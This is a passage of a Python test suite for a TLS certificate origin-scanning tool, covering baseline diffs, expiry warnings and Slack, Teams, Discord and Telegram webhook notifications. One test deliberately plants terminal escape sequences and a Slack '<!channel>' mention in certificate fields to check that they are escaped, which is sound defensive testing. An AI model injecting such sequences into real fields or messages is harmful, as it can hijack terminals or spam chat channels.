            ('endpoint', 'disappeared', None, '10.0.0.4', None),
        ])
        by_ip = {(c['ip'], c['scope']): c for c in changes}
        extra = changes[0]
        self.assertEqual(extra['after'], {'endpoints': 6, 'statusCounts': {'NOT_HOSTED': 6}})
        installed = by_ip[('10.0.0.1', 'row')]
        self.assertEqual((installed['servers'], installed['port'], installed['probe']),
                         (['web'], 443, 'sni'))
        self.assertTrue(installed['certChanged'])
        self.assertEqual(installed['before']['certSha256'], EXPECTED['ec_wildcard.pem']['sha256'])
        self.assertEqual(installed['after']['certSha256'], RENEWED_WILD_SHA256)
        self.assertEqual(set(installed['before']), {'status', 'certSha256', 'certSubjectCN',
                                                     'certIssuer', 'certNotAfter', 'error'})
        closed = by_ip[('10.0.0.3', 'endpoint')]
        self.assertEqual(closed['before'], {'status': 'OPEN', 'error': None, 'names': 2,
                                            'statusCounts': {'UPDATED': 1, 'NEEDS_UPDATE': 1}})
        self.assertEqual(closed['after']['status'], 'CLOSED')
        self.assertEqual(by_ip[('10.0.0.5', 'endpoint')]['after']['names'], 3)
        timeout = by_ip[('10.0.0.6', 'row')]
        self.assertEqual((timeout['after']['status'], timeout['after']['error']),
                         ('TIMEOUT', 'timed out'))
        self.assertFalse(timeout['certChanged'])
        shared = by_ip[('10.0.0.7', 'row')]
        self.assertEqual(shared['servers'], ['shared-a', 'shared-b'])  # one change, both servers
        self.assertTrue(shared['certChanged'])
        self.assertEqual(by_ip[('10.0.0.4', 'endpoint')]['after'],
                         {'status': 'EXCLUDED', 'excludedBy': '10.0.0.4'})
        self.assertIsNone(by_ip[('10.0.0.8', 'endpoint')]['before'])
        # the JSON round trip (a baseline read from disk) changes nothing
        self.assertEqual(sos.compare_reports(json.loads(json.dumps(before)), after), changes)

    def test_nothing_changed(self):
        before = sos.report_to_dict(fleet_before())
        self.assertEqual(sos.compare_reports(before, before), [])
        again = sos.report_to_dict(fleet_before())  # another run, other times and timings
        self.assertEqual(sos.compare_reports(before, again), [])
        # an address written in another form is the same endpoint
        v6_before = scan_doc([sos.Server('v6', ['2001:db8::5'])],
                             {'2001:db8::5': by_old_or_new(EC_DER)})
        for row in v6_before['results']:
            row['ip'] = '2001:0DB8:0:0::5'
        v6_after = scan_doc([sos.Server('v6', ['2001:db8::5'])],
                            {'2001:db8::5': by_old_or_new(EC_DER)})
        self.assertEqual(sos.compare_reports(v6_before, v6_after), [])

    def test_certificate_changes_and_fallback_certificates(self):
        names = (WILD, 'nothere.example.com')
        before = scan_doc([sos.Server('web', ['10.0.0.1'])],
                          {'10.0.0.1': lambda sni: EC_DER if sni == WILD else CN_ONLY_DER},
                          names=names, new_certs=())
        after = scan_doc([sos.Server('web', ['10.0.0.1'])],
                         {'10.0.0.1': lambda sni: RENEWED_DER if sni == WILD else RSA_DER},
                         names=names, new_certs=())
        changes = sos.compare_reports(before, after)
        # NEEDS_UPDATE both times (no --cert) with another certificate: a 'cert' change; the
        # no-SNI certificate changed too; nothere.example.com is NOT_HOSTED with another
        # fallback certificate - not a change
        self.assertEqual([(c['kind'], c['probe'], c['name'], c['after']['status'])
                          for c in changes],
                         [('cert', 'default', None, 'NOT_HOSTED'),
                          ('cert', 'sni', WILD, 'NEEDS_UPDATE')])
        self.assertTrue(all(c['certChanged'] and c['transition'] is None for c in changes))
        info = sos.baseline_info(before, after, 'last.json')
        self.assertFalse(info['newCertificateChanged'])

    def test_names_and_ports_that_differ(self):
        tls = {'10.0.0.1': by_old_or_new(RENEWED_DER)}
        before = scan_doc([sos.Server('web', ['10.0.0.1'])], tls, names=(WILD, WWW),
                          ports=(443, 8443))
        after = scan_doc([sos.Server('web', ['10.0.0.1'])], tls, names=(WILD,),
                         ports=(443, 9443), new_certs=())
        changes = sos.compare_reports(before, after)
        # WWW's rows are summed up in the name change; without --cert the renewed
        # certificate is NEEDS_UPDATE, which the baseline notes explain
        self.assertEqual(change_keys(changes), [
            ('name', 'disappeared', None, None, WWW),
            ('row', 'status', 'regressed', '10.0.0.1', WILD),
            ('endpoint', 'appeared', None, '10.0.0.1', None),
            ('endpoint', 'disappeared', None, '10.0.0.1', None),
        ])
        self.assertEqual(changes[0]['before'],
                         {'endpoints': 2, 'statusCounts': {'NEEDS_UPDATE': 2}})
        self.assertEqual([(c['port'], c['kind']) for c in changes if c['scope'] == 'endpoint'],
                         [(9443, 'appeared'), (8443, 'disappeared')])
        info = sos.baseline_info(before, after, 'last.json')
        self.assertEqual((info['portsAdded'], info['portsRemoved']), ([9443], [8443]))
        self.assertTrue(info['newCertificateChanged'])
        self.assertEqual(info['file'], 'last.json')
        self.assertEqual(info['finishedAt'], before['finishedAt'])
        notes = sos.baseline_notes(info)
        self.assertEqual(notes[0], 'Ports differ from the baseline: added 9443; removed 8443.')
        self.assertIn('--cert', notes[1])

    def test_status_transitions(self):
        table = [('UPDATED', 'NEEDS_UPDATE', 'regressed'), ('NEEDS_UPDATE', 'UPDATED', 'updated'),
                 ('UPDATED', 'NOT_HOSTED', 'unhosted'), ('NEEDS_UPDATE', 'NOT_HOSTED', 'unhosted'),
                 ('NOT_HOSTED', 'UPDATED', 'hosted'), ('UPDATED', 'TLS_ERROR', 'failed'),
                 ('NOT_HOSTED', 'TIMEOUT', 'failed'), ('OPEN', 'CLOSED', 'failed'),
                 ('TIMEOUT', 'NEEDS_UPDATE', 'recovered'), ('CLOSED', 'OPEN', 'recovered'),
                 ('TLS_ERROR', 'TIMEOUT', 'changed'), ('CLOSED', 'TIMEOUT', 'changed'),
                 # a status of a later version (a kind of certificate) covers the name
                 ('ORIGIN_CERT', 'NEEDS_UPDATE', 'changed'), ('UPDATED', 'ORIGIN_CERT', 'regressed'),
                 ('PRIVATE_CERT', 'UPDATED', 'updated'), ('ORIGIN_CERT', 'NOT_HOSTED', 'unhosted'),
                 ('NOT_HOSTED', 'PRIVATE_CERT', 'hosted'), ('PRIVATE_CERT', 'TLS_ERROR', 'failed')]
        for before, after, want in table:
            self.assertEqual(sos.status_transition(before, after), want, (before, after))

    def test_statuses_of_a_later_version(self):
        """A baseline or a report with a status this version does not know compares like
        UPDATED / NEEDS_UPDATE: its certificate covers the name."""
        tls = {'10.0.0.1': by_old_or_new(EC_DER)}
        before = scan_doc([sos.Server('web', ['10.0.0.1'])], tls, now=BEFORE_RSA_EXPIRY)
        after = json.loads(json.dumps(before))
        for doc, der in ((before, EC_DER), (after, RENEWED_DER)):
            for row in doc['results']:
                if row['name'] == WILD:
                    row['status'] = 'ORIGIN_CERT'
                    row['certSha256'] = hashlib.sha256(der).hexdigest()
        self.assertIsNone(sos.baseline_problem(before))
        changes = sos.compare_reports(before, after)
        self.assertEqual([(c['kind'], c['name'], c['after']['status']) for c in changes],
                         [('cert', WILD, 'ORIGIN_CERT')])
        self.assertIn('ORIGIN_CERT, certificate changed', sos.change_text(changes[0]))
        # ... and its certificate expiring soon is a warning, a NOT_HOSTED one is not
        for row in after['results']:
            if row['name'] == WWW:
                row['status'] = 'PRIVATE_CERT'
        self.assertEqual([e['subjectCN'] for e in sos.expiring_certificates(after, 30)], [WWW])
        for row in after['results']:
            if row['name'] == WWW:
                row['status'] = 'NOT_HOSTED'
        self.assertEqual(sos.expiring_certificates(after, 30), [])


class ExpiryTests(unittest.TestCase):

    def test_expiring_certificates(self):
        servers = [sos.Server('web', ['10.0.0.1']), sos.Server('edge', ['10.0.0.2']),
                   sos.Server('lb', ['10.0.0.3'])]
        tls = {'10.0.0.1': by_old_or_new(EC_DER),
               # serves the expiring certificate by default, for a probed name
               '10.0.0.2': lambda sni: RSA_DER if sni in (None, WWW) else CN_ONLY_DER,
               # falls back to it for a name it does not host: not a warning
               '10.0.0.3': lambda sni: RSA_DER if sni == 'nothere.example.com' else RENEWED_DER}
        # no --cert: with one, a no-SNI certificate counts only for the names it covers
        # (the engine's rule), and edge's would be NOT_HOSTED
        doc = scan_doc(servers, tls, names=(WILD, WWW, 'nothere.example.com'), new_certs=(),
                       now=BEFORE_RSA_EXPIRY)
        expiring = sos.expiring_certificates(doc, 30)
        self.assertEqual(len(expiring), 1)
        entry = expiring[0]
        self.assertEqual(entry['sha256'], EXPECTED['rsa_multi_san.pem']['sha256'])
        self.assertEqual((entry['daysLeft'], entry['expired'], entry['isNewCert']),
                         (12, False, False))
        self.assertEqual(entry['notAfter'], '2034-06-01T00:00:00.000Z')
        self.assertEqual(entry['subjectCN'], WWW)
        self.assertEqual(entry['endpoints'], [
            {'server': 'web', 'ip': '10.0.0.1', 'port': 443, 'names': [WWW], 'defaultCert': False},
            {'server': 'edge', 'ip': '10.0.0.2', 'port': 443, 'names': [WWW], 'defaultCert': True}])
        lb = next(row for row in doc['results'] if row['server'] == 'lb'
                  and row['name'] == 'nothere.example.com')
        self.assertEqual((lb['status'], lb['certDaysLeft']), ('NOT_HOSTED', 12))
        self.assertEqual(sos.expiring_certificates(doc, 11), [])
        self.assertEqual(len(sos.expiring_certificates(doc, 12)), 1)

    def test_expired_certificates_come_first(self):
        now = datetime(2034, 6, 3, 12, 0, 0, tzinfo=timezone.utc)
        doc = scan_doc([sos.Server('web', ['10.0.0.1'])], {'10.0.0.1': by_old_or_new(EC_DER)},
                       now=now)
        expiring = sos.expiring_certificates(doc, 36500 // 2)  # EC expires 2051 too
        self.assertEqual([e['subjectCN'] for e in expiring], [WWW, '*.wild.example.net'])
        self.assertEqual((expiring[0]['daysLeft'], expiring[0]['expired']), (-3, True))
        self.assertIn('EXPIRED 3 days ago', sos.expiring_text(expiring[0]))
        self.assertEqual(sos.expiring_certificates(doc, 0)[0]['daysLeft'], -3)

    def test_summary_json_and_nothing_to_warn(self):
        report = scan_report([sos.Server('web', ['10.0.0.1'])],
                             {'10.0.0.1': by_old_or_new(RENEWED_DER)}, now=BEFORE_RSA_EXPIRY)
        monitor = sos.build_monitor(report, warn_days=30)
        self.assertIsNone(monitor.changes)
        text = sos.render_summary(report, monitor=monitor)
        self.assertIn('Served certificates expiring within 30 days: 1', text)
        self.assertIn('www.example-test.com.tr | expires 2034-06-01 (12 days left)', text)
        self.assertIn('      web 10.0.0.1:443: www.example-test.com.tr', text)
        doc = sos.report_to_dict(report, monitor)
        self.assertEqual(doc['options']['warnDays'], 30)
        self.assertEqual(len(doc['expiring']), 1)
        self.assertNotIn('changes', doc)
        self.assertNotIn('baseline', doc)
        quiet = sos.build_monitor(report, warn_days=5)
        self.assertIn('Served certificates expiring within 5 days: none',
                      sos.render_summary(report, monitor=quiet))
        self.assertEqual(sos.report_to_dict(report, quiet)['expiring'], [])
        # no monitoring: the plain document, byte for byte
        self.assertEqual(sos.render_json(report), sos.render_json(report, monitor=None))
        self.assertNotIn('warnDays', sos.report_to_dict(report)['options'])

    def test_one_certificate_on_thousands_of_endpoints_is_linear(self):
        """A fleet-wide wildcard expiring: 30,000 rows took ~27 s with a list scan per row."""
        sha = 'ab' * 32
        rows = [{'server': 'web-%d' % i, 'ip': '10.%d.%d.%d' % (i >> 16, (i >> 8) & 255, i & 255),
                 'port': 443, 'probe': 'sni', 'name': 'n%d.example.com' % n,
                 'status': 'NEEDS_UPDATE', 'certSha256': sha, 'certSubjectCN': '*.example.com',
                 'certDaysLeft': 5, 'certNotAfter': '2034-06-01T00:00:00.000Z'}
                for i in range(6000) for n in range(5)]
        rows.extend(dict(rows[i * 5], probe='default', name=None) for i in range(6000))
        rows.append(dict(rows[0]))  # a repeated row adds nothing
        started = time.monotonic()
        expiring = sos.expiring_certificates({'results': rows, 'certificates': {}}, 30)
        self.assertLess(time.monotonic() - started, 5.0)
        self.assertEqual(len(expiring), 1)
        endpoints = expiring[0]['endpoints']
        self.assertEqual(len(endpoints), 6000)
        self.assertEqual(endpoints[0], {'server': 'web-0', 'ip': '10.0.0.0', 'port': 443,
                                        'names': ['n%d.example.com' % n for n in range(5)],
                                        'defaultCert': True})


class ChangeSummaryTests(unittest.TestCase):

    @classmethod
    def setUpClass(cls):
        cls.before = sos.report_to_dict(fleet_before())
        cls.report = fleet_after()
        cls.monitor = sos.build_monitor(cls.report, cls.before, 'last.json')

    def test_summary_section(self):
        text = sos.render_summary(self.report, width=1000, monitor=self.monitor)
        lines = text.splitlines()
        head = next(i for i, line in enumerate(lines) if line.startswith('Changes since'))
        self.assertEqual(lines[head], 'Changes since the baseline (last.json, scan of %s): 9'
                         % sos._iso_minute(self.before['finishedAt']))
        self.assertLess(head, next(i for i, line in enumerate(lines)
                                   if line.startswith('Servers that need')))
        section = lines[head + 1:lines.index('', head)]
        self.assertEqual(len(section), 9)
        section = '\n'.join(section)
        # on a 100-column terminal long changes wrap under their text
        narrow = sos.render_summary(self.report, width=100, monitor=self.monitor).splitlines()
        start = narrow.index(lines[head])
        block = narrow[start + 1:narrow.index('', start)]
        self.assertGreater(len(block), 9)
        self.assertTrue(all(len(line) <= 100 for line in block), block)
        self.assertTrue(all(line.startswith(' ' * 13) for line in block
                            if not line.startswith('  ' + line.strip()[:1])), block)
        for needle in (
                '  NEW        name extra.example.com: now probed, on 6 endpoint(s): NOT_HOSTED 6',
                '  UPDATED    web 10.0.0.1:443 a.wild.example.net: NEEDS_UPDATE -> UPDATED, '
                'certificate changed (CN *.wild.example.net): expires 2051-01-01, sha256 1f7337a3 '
                '-> expires 2052-01-01, sha256 773223c6',
                '  REGRESSED  upd 10.0.0.2:443 a.wild.example.net: UPDATED -> NEEDS_UPDATE',
                '  FAILED     db 10.0.0.3:443: OPEN (2 names: UPDATED 1, NEEDS_UPDATE 1) -> CLOSED',
                '  RECOVERED  down 10.0.0.5:443: CLOSED',
                '  FAILED     flaky 10.0.0.6:443 a.wild.example.net: UPDATED -> TIMEOUT '
                '(timed out)',
                '  UNHOSTED   shared-a, shared-b 10.0.0.7:443 a.wild.example.net: UPDATED -> '
                'NOT_HOSTED, certificate changed: CN *.wild.example.net, expires 2052-01-01, '
                'sha256 773223c6 -> CN legacy.example.org, expires 2035-01-01, sha256 18a96600',
                '  NEW        new 10.0.0.8:443: new endpoint, OPEN (3 names: UPDATED 1, '
                'NEEDS_UPDATE 1, NOT_HOSTED 1)',
                '  GONE       gone 10.0.0.4:443: excluded by --exclude 10.0.0.4 now; was OPEN '
                '(2 names: NEEDS_UPDATE 2)'):
            self.assertIn(needle, section)
        colored = sos.render_summary(self.report, color=True, monitor=self.monitor)
        self.assertIn('\x1b[31;1mREGRESSED\x1b[0m', colored)
        self.assertIn('\x1b[32mRECOVERED\x1b[0m', colored)

    def test_long_lists_are_capped_without_show_all(self):
        many = [dict(self.monitor.changes[1], name='n%d.example.com' % i) for i in range(60)]
        monitor = sos.MonitorResult(baseline=self.monitor.baseline, changes=many)
        text = sos.render_summary(self.report, width=200, monitor=monitor)
        self.assertIn(' n49.example.com:', text)
        self.assertNotIn(' n50.example.com:', text)
        self.assertIn('... and 10 more - use --show-all or the --json report to list them.', text)
        everything = sos.render_summary(self.report, width=200, show_all=True, monitor=monitor)
        self.assertIn('n59.example.com', everything)
        self.assertNotIn('... and 10 more', everything)

    def test_no_changes_and_first_run(self):
        report = fleet_before()
        same = sos.build_monitor(report, sos.report_to_dict(report), 'last.json')
        self.assertIn('Changes since the baseline (last.json, scan of ',
                      sos.render_summary(report, monitor=same))
        self.assertIn('): none', sos.render_summary(report, monitor=same))
        first = sos.build_monitor(report, None, 'last.json')
        self.assertEqual((first.changes, first.baseline), ([], {'file': 'last.json',
                                                                'missing': True}))
        self.assertIn('Baseline last.json does not exist yet: nothing to compare (first run).',
                      sos.render_summary(report, monitor=first))
        doc = sos.report_to_dict(report, first)
        self.assertEqual((doc['baseline'], doc['changes']), (first.baseline, []))

    def test_untrusted_text_is_escaped(self):
        before = json.loads(json.dumps(self.before))
        for row in before['results']:
            if row['ip'] == '10.0.0.2' and row['name'] == WILD:
                row['certSubjectCN'] = '\x1b]0;owned\x07<!channel>'
                row['server'] = 'upd\x1b[2K'
        monitor = sos.build_monitor(self.report, before, 'last\x1b[1A.json')
        text = sos.render_summary(self.report, monitor=monitor)
        plain = re.sub(r'\x1b\[[0-9;]*m', '', text)
        self.assertNotIn('\x1b', plain)
        self.assertNotIn('\x07', plain)
        self.assertIn('last\\x1b[1A.json', plain)
        title, items, _footer = sos.notification_message(sos.report_to_dict(self.report, monitor),
                                                         monitor)
        self.assertFalse(any('\x1b' in line or '\x07' in line for line in items))
        self.assertTrue(any('\\x1b]0;owned\\x07<!channel>' in line for line in items))
        _url, slack = sos.build_notification('slack', 'https://hooks.slack.com/services/T/B/x',
                                             sos.report_to_dict(self.report, monitor), monitor)
        self.assertNotIn('<!channel>', slack['text'])
        self.assertIn('&lt;!channel&gt;', slack['text'])


# --- --notify ---------------------------------------------------------------------------

SLACK_URL = 'https://hooks.slack.com/services/' + 'T00000000/B00000000/' + 'X' * 24
TELEGRAM_URL = ('https://api.telegram.org/bot123456:TEST-token_value/sendMessage'
                '?chat_id=-1001234567890')


class NotifyFormatTests(unittest.TestCase):

    @classmethod
    def setUpClass(cls):
        cls.report = fleet_after(now=BEFORE_RSA_EXPIRY)
        cls.monitor = sos.build_monitor(cls.report, sos.report_to_dict(fleet_before()),
                                        'last.json', warn_days=30)
        cls.doc = sos.report_to_dict(cls.report, cls.monitor)

    def test_detect_notify_format(self):
        table = {
            SLACK_URL: 'slack',
            'https://hooks.slack.com/triggers/T000/111/abc': 'slack',
            'https://discord.com/api/webhooks/123/token-value': 'discord',
            'https://discordapp.com/api/webhooks/123/token-value': 'discord',
            'https://discord.com/api/webhooks/123/token-value/slack': 'slack',
            'https://discord.com/channels/123': 'json',
            TELEGRAM_URL: 'telegram',
            'https://example.webhook.office.com/webhookb2/abc@def/IncomingWebhook/123/456': 'teams',
            'https://outlook.office.com/webhook/abc/IncomingWebhook/def/ghi': 'teams',
            'https://prod-00.westeurope.logic.azure.com:443/workflows/abc/triggers/manual/paths/'
            'invoke?api-version=2016-06-01&sp=%2Ftriggers%2Fmanual%2Frun&sv=1.0&sig=abc': 'teams',
            'https://default0000.00.environment.api.powerplatform.com:443/powerautomate/'
            'automations/direct/workflows/abc/triggers/manual/paths/invoke?sig=abc': 'teams',
            'https://HOOKS.SLACK.COM/services/a/b/c': 'slack',
            'https://example.com/hooks/ssl': 'json',
            'http://127.0.0.1:8080/hook': 'json',
        }
        for url, want in table.items():
            self.assertEqual(sos.detect_notify_format(url), want, url)
            self.assertEqual(sos.check_notify_url(url), want, url)

    def test_bad_urls_are_refused_without_repeating_them(self):
        secret = 'SECRET0token'
        cases = {
            'ftp://example.com/%s' % secret: 'http:// or https://',
            'file:///etc/%s' % secret: 'http:// or https://',
            'https:///%s' % secret: 'http:// or https://',
            'https://example.com:port/%s' % secret: 'not a valid URL',
            'https://example.com/%s x' % secret: 'spaces or control characters',
            'https://example.com/%s\n' % secret: 'spaces or control characters',
            'https://api.telegram.org/bot1:%s/sendMessage' % secret: 'Telegram URL looks like',
            'https://api.telegram.org/bot1:%s/getMe?chat_id=1' % secret: 'Telegram URL looks like',
        }
        for url, needle in cases.items():
            with self.subTest(url=url):
                with self.assertRaises(sos.UsageError) as ctx:
                    sos.check_notify_url(url, source=sos.NOTIFY_ENV)
                self.assertIn(needle, str(ctx.exception))
                self.assertIn(sos.NOTIFY_ENV, str(ctx.exception))
                self.assertNotIn(secret, str(ctx.exception))
        with self.assertRaises(sos.UsageError):
            sos.check_notify_url('http://127.0.0.1/hook', 'telegram')  # no chat_id
        self.assertEqual(sos.check_notify_url('http://127.0.0.1/bot1:x/sendMessage?chat_id=5',
                                              'telegram'), 'telegram')

    def test_redaction_and_hosts(self):
        text = ('POST %s failed: T00000000/B00000000 no_service XXXXXXXXXXXXXXXXXXXXXXXX'
                % SLACK_URL)
        redacted = sos.redact_url(text, SLACK_URL)
        self.assertNotIn('XXXXXXXXXXXXXXXXXXXXXXXX', redacted)
        self.assertNotIn('T00000000', redacted)
        self.assertIn('no_service', redacted)
        url = 'https://user:pa55word@example.com/hook?sig=s1gnature%2Fvalue&api-version=1'
        redacted = sos.redact_url('x user:pa55word s1gnature/value s1gnature%2Fvalue', url)
        self.assertNotIn('pa55word', redacted)
        self.assertNotIn('s1gnature', redacted)
        self.assertEqual(sos.notify_host(SLACK_URL), 'hooks.slack.com')
        self.assertEqual(sos.notify_host('http://[::1]:8080/x'), '[::1]:8080')
        self.assertEqual(sos.notify_host(url), 'example.com')
        self.assertTrue(sos.notify_is_plaintext('http://example.com/hook'))
        for url in ('https://example.com/hook', 'http://127.0.0.1:9/x', 'http://localhost/x',
                    'http://[::1]/x'):
            self.assertFalse(sos.notify_is_plaintext(url), url)

    def test_title_items_and_footer(self):
        title, items, footer = sos.notification_message(self.doc, self.monitor)
        self.assertEqual(title, 'SSL origin scan: 9 changes since %s; 1 certificate expiring '
                         'within 30 days' % sos._iso_minute(self.monitor.baseline['finishedAt']))
        self.assertEqual(len(items), 10)  # 9 changes + 1 certificate
        self.assertTrue(items[1].startswith('- UPDATED web 10.0.0.1:443 a.wild.example.net: '))
        self.assertTrue(items[-1].startswith('- EXPIRES CN www.example-test.com.tr, expires '
                                             '2034-06-01'))
        self.assertIn('served by web 10.0.0.1:443, upd 10.0.0.2:443, down 10.0.0.5:443 +4',
                      items[-1])
        # the excluded server is not scanned; flaky (TIMEOUT) and shared (NOT_HOSTED) not counted
        self.assertEqual(footer[0], 'Scan of 2034-05-20 00:00 UTC: 8 server(s), 7 endpoint(s) '
                         '(6 open), ports 443, names a.wild.example.net, '
                         'www.example-test.com.tr, extra.example.com.')
        self.assertEqual(footer[1], 'Servers that need the new certificate: 1; serving it: 3.')
        report = fleet_before()
        quiet = sos.build_monitor(report, sos.report_to_dict(report), 'last.json', warn_days=5)
        title, items, _ = sos.notification_message(sos.report_to_dict(report, quiet), quiet)
        self.assertEqual(items, [])
        self.assertIn('no changes since', title)
        self.assertIn('no certificate expiring within 5 days', title)
        self.assertFalse(sos.should_notify(quiet))
        self.assertTrue(sos.should_notify(quiet, always=True))
        self.assertTrue(sos.should_notify(self.monitor))
        self.assertFalse(sos.should_notify(None))
        self.assertEqual(sos.notification_message(sos.report_to_dict(report))[0],
                         'SSL origin scan: finished')

    def test_payloads(self):
        url, slack = sos.build_notification('slack', SLACK_URL, self.doc, self.monitor)
        self.assertEqual((url, list(slack)), (SLACK_URL, ['text']))
        self.assertTrue(slack['text'].startswith('*SSL origin scan: 9 changes since '))
        self.assertIn('\n```\n- NEW name extra.example.com', slack['text'])
        self.assertIn('NEEDS_UPDATE -&gt; UPDATED', slack['text'])
        self.assertTrue(slack['text'].endswith('```'))

        _, discord = sos.build_notification('discord', 'https://discord.com/api/webhooks/1/x',
                                            self.doc, self.monitor)
        self.assertEqual(discord['allowed_mentions'], {'parse': []})
        self.assertTrue(discord['content'].startswith('**SSL origin scan: '))
        self.assertLessEqual(len(discord['content']), 2000)

        _, teams = sos.build_notification('teams', 'https://example.webhook.office.com/x',
                                          self.doc, self.monitor)
        self.assertEqual(teams['type'], 'message')
        card = teams['attachments'][0]
        self.assertEqual(card['contentType'], 'application/vnd.microsoft.card.adaptive')
        self.assertEqual(card['content']['type'], 'AdaptiveCard')
        blocks = card['content']['body']
        self.assertTrue(all(block['type'] == 'RichTextBlock' for block in blocks))
        self.assertEqual(blocks[0]['inlines'][0]['weight'], 'Bolder')
        self.assertTrue(blocks[0]['inlines'][0]['text'].startswith('SSL origin scan: 9 changes'))
        self.assertEqual(len(blocks), 1 + 10 + 2)  # title, items, footer

        url, telegram = sos.build_notification('telegram', TELEGRAM_URL, self.doc, self.monitor)
        self.assertEqual(url, 'https://api.telegram.org/bot123456:TEST-token_value/sendMessage')
        self.assertEqual(telegram['chat_id'], -1001234567890)
        self.assertTrue(telegram['text'].startswith('SSL origin scan: 9 changes since '))
        self.assertEqual(telegram['link_preview_options'], {'is_disabled': True})
        url, telegram = sos.build_notification(
            'telegram', 'https://api.telegram.org/bot1:x/sendMessage?chat_id=%40channel'
            '&message_thread_id=7', self.doc, self.monitor)
        self.assertEqual(url, 'https://api.telegram.org/bot1:x/sendMessage?message_thread_id=7')
        self.assertEqual(telegram['chat_id'], '@channel')

        _, generic = sos.build_notification('json', 'https://example.com/hook', self.doc,
                                            self.monitor)
        self.assertEqual(set(generic), {'tool', 'version', 'title', 'text', 'finishedAt',
                                        'summary', 'baseline', 'changes', 'changesTotal',
                                        'warnDays', 'expiring'})
        self.assertEqual(generic['changes'], self.monitor.changes)
        self.assertEqual((generic['changesTotal'], generic['warnDays']), (9, 30))
        self.assertEqual(generic['summary'], self.doc['summary'])
        json.dumps(generic)  # serialisable

    def test_long_messages_fit_every_format(self):
        many = [dict(self.monitor.changes[1], name='host-%03d.example.com' % i)
                for i in range(300)]
        monitor = sos.MonitorResult(baseline=self.monitor.baseline, changes=many)
        doc = sos.report_to_dict(self.report, monitor)
        limits = {'slack': 4000, 'discord': 2000, 'telegram': 4096}
        for fmt, limit in limits.items():
            _, payload = sos.build_notification(fmt, TELEGRAM_URL, doc, monitor)
            text = payload.get('text') or payload.get('content')
            self.assertLessEqual(len(text), limit, fmt)
            self.assertIn('more', text)
            self.assertIn('Scan of ', text)  # the footer always makes it
        _, generic = sos.build_notification('json', 'https://example.com/hook', doc, monitor)
        self.assertEqual((len(generic['changes']), generic['changesTotal']), (300, 300))
        many = many * 2
        monitor = sos.MonitorResult(baseline=self.monitor.baseline, changes=many)
        _, generic = sos.build_notification('json', 'https://example.com/hook', doc, monitor)
        self.assertEqual((len(generic['changes']), generic['changesTotal']),
                         (sos.NOTIFY_MAX_JSON_CHANGES, 600))


class WebhookReceiver:
    """A local webhook: records each request and answers from a script.

    ``script`` items are a status, or ``(status, headers, body)``; 200 once it runs out.
    ``delay`` seconds pass before each answer.
    """

    def __init__(self, script=(), delay=0.0) -> None:
        self.requests = []  # type: List[Dict[str, object]]
        self.script = list(script)
        self.delay = delay
        receiver = self

        class Handler(http.server.BaseHTTPRequestHandler):
            def _record(self, method: str) -> None:
                length = int(self.headers.get('Content-Length') or 0)
                receiver.requests.append({'method': method, 'path': self.path,
                                          'headers': dict(self.headers),
                                          'body': self.rfile.read(length)})
                if receiver.delay:
                    time.sleep(receiver.delay)
                answer = receiver.script.pop(0) if receiver.script else 200
                status, headers, body = (answer if isinstance(answer, tuple)
                                         else (answer, {}, b'ok'))
                self.send_response(status)
                for key, value in headers.items():
                    self.send_header(key, value)
                self.send_header('Content-Length', str(len(body)))
                self.end_headers()
                self.wfile.write(body)

            def do_POST(self) -> None:  # noqa: N802
                self._record('POST')

            def do_GET(self) -> None:  # noqa: N802
                self._record('GET')

            def log_message(self, *args) -> None:
                pass

        self.server = http.server.ThreadingHTTPServer(('127.0.0.1', 0), Handler)
        self.server.handle_error = lambda request, address: None  # a client that gave up
        self.thread = threading.Thread(target=self.server.serve_forever, daemon=True,
                                       kwargs={'poll_interval': 0.02})
        self.thread.start()

    def url(self, path: str) -> str:
        return 'http://127.0.0.1:%d%s' % (self.server.server_address[1], path)

    def payloads(self):
        return [json.loads(r['body'].decode('utf-8')) for r in self.requests
                if r['method'] == 'POST']

    def __enter__(self) -> 'WebhookReceiver':
        return self

    def __exit__(self, *exc) -> None:
        self.server.shutdown()
        self.server.server_close()


def no_proxy():
    """urllib must not route the local webhook through a proxy of this machine."""
    return mock.patch.dict(os.environ, {'NO_PROXY': '*', 'no_proxy': '*'})


class NotifyDeliveryTests(unittest.TestCase):
    """--notify end to end through a local http.server (no Internet)."""

    TOKEN = 'SECRETTOKEN0123456789'

    @classmethod
    def setUpClass(cls):
        cls.before, cls.after = fleet_before(), fleet_after()
        cls.tmp = tempfile.TemporaryDirectory()
        cls.baseline = os.path.join(cls.tmp.name, 'last.json')
        Path(cls.baseline).write_text(sos.render_json(cls.before), encoding='utf-8')

    @classmethod
    def tearDownClass(cls):
        cls.tmp.cleanup()

    def run_cli(self, *args, report=None, script=(), delay=0.0, path=None, env=False):
        """run_main with a scan that returns ``report`` (fleet_after) and a local webhook
        whose URL replaces the argument ``URL`` (or goes into the environment)."""
        with WebhookReceiver(script, delay) as hook, no_proxy(), contextlib.ExitStack() as stack:
            url = hook.url(path or '/services/T0/B0/%s' % self.TOKEN)
            stack.enter_context(mock.patch.object(sos, 'run_scan',
                                                  return_value=report or self.after))
            stack.enter_context(mock.patch.object(sos, 'NOTIFY_RETRY_DELAY', 0.01))
            stack.enter_context(mock.patch.object(sos, 'NOTIFY_TIMEOUT', 5.0))
            stack.enter_context(mock.patch.dict(os.environ, {sos.NOTIFY_ENV: url if env else ''}))
            args = tuple(url if arg == 'URL' else arg for arg in args)
            code, out, err = run_main('-t', '127.0.0.1', '-n', WILD, '--no-color', *args)
        self.assertNotIn(self.TOKEN, out + err)
        return code, out, err, hook

    def test_each_format_through_a_local_webhook(self):
        for fmt in ('slack', 'teams', 'discord', 'telegram', 'json'):
            path = ('/bot123456:%s/sendMessage?chat_id=-1001234567890' % self.TOKEN
                    if fmt == 'telegram' else None)
            with self.subTest(fmt=fmt):
                code, _out, err, hook = self.run_cli('--baseline', self.baseline, '--notify',
                                                     'URL', '--notify-format', fmt, path=path)
                self.assertEqual(code, 0, err)
                self.assertEqual(len(hook.requests), 1)
                request = hook.requests[0]
                self.assertEqual(request['method'], 'POST')
                headers = {k.lower(): v for k, v in request['headers'].items()}
                self.assertEqual(headers['content-type'], 'application/json; charset=utf-8')
                self.assertTrue(headers['user-agent'].startswith('ssl_origin_scan/'))
                payload = hook.payloads()[0]
                self.assertIn('Notification sent (%s, 127.0.0.1:' % fmt, err)
                if fmt == 'slack':
                    self.assertTrue(payload['text'].startswith('*SSL origin scan: 9 changes'))
                elif fmt == 'teams':
                    self.assertEqual(payload['attachments'][0]['content']['type'],
                                     'AdaptiveCard')
                elif fmt == 'discord':
                    self.assertEqual(payload['allowed_mentions'], {'parse': []})
